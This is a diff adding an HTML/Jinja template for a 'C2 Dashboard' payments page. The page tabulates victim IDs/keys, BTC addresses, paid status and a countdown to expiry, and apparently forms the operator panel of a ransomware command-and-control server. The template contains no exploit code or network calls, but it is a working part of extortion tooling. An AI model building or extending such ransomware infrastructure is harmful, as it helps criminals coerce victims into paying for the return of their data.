@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='Style.css') }}">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-brand">C2 Dashboard</div>
+        <ul class="nav-links">
+            <li><a href="/dashboard/home">Home</a></li>
+            <li><a href="/dashboard/log">Log</a></li>
+            <li><a href="/dashboard/payments">Payments</a></li>
+        </ul>
+    </nav>
+
+    <main class="container">
+        <h1>C2 Dashboard Payments</h1>
+        <div class="button-group">
+            <button onclick="window.location.reload()"><span class="refresh-icon">⟳</span></button>
+        </div>
+        <table>
+        <thead>
+            <tr>
+                <th>Unique ID/Key</th>
+                <th>BTC Address</th>
+                <th>Paid</th>
+                <th>Created At</th>
+                <th>Time Left</th>
+            </tr>
+        </thead>
+            <tbody>
+                {% for payment in log_data %}
+                <tr>
+                    <td>{{ payment.unique_id }}</td>
+                    <td>{{ payment.btc_address }}</td>
+                    <td>{{ 'Yes' if payment.paid else 'No' }}</td>
+                    <td>{{ payment.created_at }}</td>
+                    <td>{% if payment.paid %} -
+                        {% elif payment.time_left == 0 %} Expired
+                        {% else %} {{ (payment.time_left // 60)|int }} Min {{ (payment.time_left % 60)|int }} Sec 
+                        {% endif %}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </main>
+</body>
+</html>
